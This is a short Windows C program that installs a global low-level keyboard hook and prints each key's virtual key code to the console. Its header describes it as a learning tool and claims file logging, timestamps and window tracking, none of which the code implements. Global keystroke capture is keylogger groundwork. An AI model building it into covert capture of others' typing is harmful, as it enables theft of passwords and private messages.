//
// A tool that logs key presses into a file, made for understanding how input works in OS.
//
//Features:
//
//Capture input globally.
//
//Store keypresses with timestamps.
//
//Optional: Monitor active window names.
//

#include <stdio.h>
#include <windows.h>


HHOOK hook;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
        printf("Key pressed: %d\n", p->vkCode);
    }
    return CallNextHookEx(hook, nCode, wParam, lParam);
}

int main() {
    // Set hook
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (hook == NULL) {
        printf("Failed to install hook!\n");
        return 1;
    }

    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook when done (never reached in this example)
    UnhookWindowsHookEx(hook);
    return 0;
}